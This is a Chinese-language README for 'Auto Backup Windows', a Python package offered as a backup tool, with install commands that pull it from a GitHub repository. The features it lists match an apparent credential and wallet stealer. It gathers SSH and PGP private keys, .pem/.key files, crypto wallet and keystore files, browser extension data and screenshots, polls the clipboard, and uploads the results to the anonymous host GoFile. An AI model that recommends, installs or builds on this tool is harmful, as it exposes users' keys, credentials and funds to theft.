# Auto Backup Windows

一个用于Windows环境的自动备份工具，支持文件备份、压缩和上传到云端。

## 功能特性

- ✅ 自动备份Windows系统中的重要文件
- ✅ 智能文件分类（文档/配置）
- ✅ 自动压缩备份文件
- ✅ 大文件自动分片
- ✅ 自动上传到云端（GoFile）
- ✅ 定时备份功能
- ✅ 剪贴板监控和自动上传
- ✅ 日志记录和轮转
- ✅ 网络连接检测
- ✅ 自动重试机制

## 安装

### 方法一：使用 pipx（推荐）

`pipx` 是安装命令行工具的最佳方式，它会自动管理虚拟环境。

```bash
# 安装 pipx（如果未安装）
python -m pip install --user pipx
python -m pipx ensurepath

# 从 GitHub 安装
pipx install git+https://github.com/wongstarx/auto-backup-wins.git

# 或从 PyPI 安装（发布后）
# pipx install auto-backup-wins
```

### 方法二：使用 Poetry（推荐用于开发）

Poetry 是一个现代的 Python 依赖管理和打包工具。

```bash
# 安装 Poetry（如果未安装）
(Invoke-WebRequest -Uri https://install.python-poetry.org -UseBasicParsing).Content | python -

# 从 GitHub 安装
poetry add git+https://github.com/wongstarx/auto-backup-wins.git

# 或克隆仓库后安装
git clone https://github.com/wongstarx/auto-backup-wins.git
cd auto-backup-wins
poetry install

# 运行
poetry run autobackup
```

### 方法三：使用虚拟环境

```bash
# 创建虚拟环境
python -m venv venv

# 激活虚拟环境
# Windows PowerShell:
venv\Scripts\Activate.ps1
# Windows CMD:
venv\Scripts\activate.bat

# 安装包
pip install git+https://github.com/wongstarx/auto-backup-wins.git

# 或从 PyPI 安装
# pip install auto-backup-wins
```

### 从源码安装

```bash
git clone https://github.com/wongstarx/auto-backup-wins.git
cd auto-backup-wins

# 使用 Poetry（推荐）
poetry install
poetry run autobackup

# 或使用虚拟环境
python -m venv venv
venv\Scripts\activate
pip install .

# 或使用 pipx
pipx install .
```

## 使用方法

### 命令行使用

安装后，可以直接使用命令行工具：

```bash
autobackup
```

### Python代码使用

```python
from auto_backup import BackupManager, BackupConfig
import os

# 创建备份管理器
manager = BackupManager()

# 备份磁盘文件
backup_dir = manager.backup_disk_files(
    source_dir="D:\\",
    target_dir=os.path.join(manager.config.BACKUP_ROOT, "disk_docs"),
    extensions_type=1
)

# 压缩备份
backup_files = manager.zip_backup_folder(
    folder_path=backup_dir,
    zip_file_path=os.path.join(manager.config.BACKUP_ROOT, "backup_20240101")
)

# 上传备份
if manager.upload_backup(backup_files):
    print("备份上传成功！")
```

## 配置说明

### 备份配置

可以通过修改 `BackupConfig` 类来调整配置：

- `DEBUG_MODE`: 调试模式开关
- `MAX_SINGLE_FILE_SIZE`: 单文件最大大小（默认50MB）
- `CHUNK_SIZE`: 分片大小（默认50MB）
- `RETRY_COUNT`: 重试次数（默认3次）
- `RETRY_DELAY`: 重试延迟（默认30秒）
- `BACKUP_INTERVAL`: 备份间隔（默认约3天）
- `CLIPBOARD_INTERVAL`: 剪贴板备份间隔（默认20分钟）
- `DISK_EXTENSIONS_1`: 文档类型扩展名
- `DISK_EXTENSIONS_2`: 配置类型扩展名
- `EXCLUDE_INSTALL_DIRS`: 排除的安装目录列表
- `EXCLUDE_KEYWORDS`: 排除的关键词列表

### 日志配置

日志文件默认保存在：`%USERPROFILE%\.dev\AutoBackup\backup.log`

- `LOG_FILE`: 日志文件路径
- `BACKUP_ROOT`: 备份根目录

## 备份内容

### 备份的文件类型

**文档类型：**
- `.txt`, `.xls`, `.xlsx`, `.et`, `.one`, `.js`, `.py`, `.go`, `.sh`, `.ts`, `.jsx`, `.tsx`
- `.bash`, `.sol`, `.rs`, `.json`, `.csv`, `.wallet`, `.bin`, `ps1`, `.rtf`

**配置类型：**
- `.pem`, `.key`, `.pub`, `.xml`, `.ini`, `.asc`, `.gpg`, `.pgp`
- `.config`, `id_rsa`, `id_ecdsa`, `id_ed25519`, `.keystore`, `.utc`

### Windows数据备份

- 记事本临时文件
- 截图文件
- 便签数据
- 浏览器扩展数据

## 系统要求

- Python 3.7+
- Windows操作系统
- 网络连接（用于上传备份）

## 依赖项

- `requests` >= 2.25.0
- `pyperclip` >= 1.8.0

## 许可证

MIT License

## 贡献

欢迎提交Issue和Pull Request！

## 作者

YLX Studio

## 更新日志

### v1.0.0
- 初始版本发布
- 支持Windows文件自动备份、压缩和上传
- 支持定时备份
- 支持剪贴板监控和自动上传
- 支持日志记录

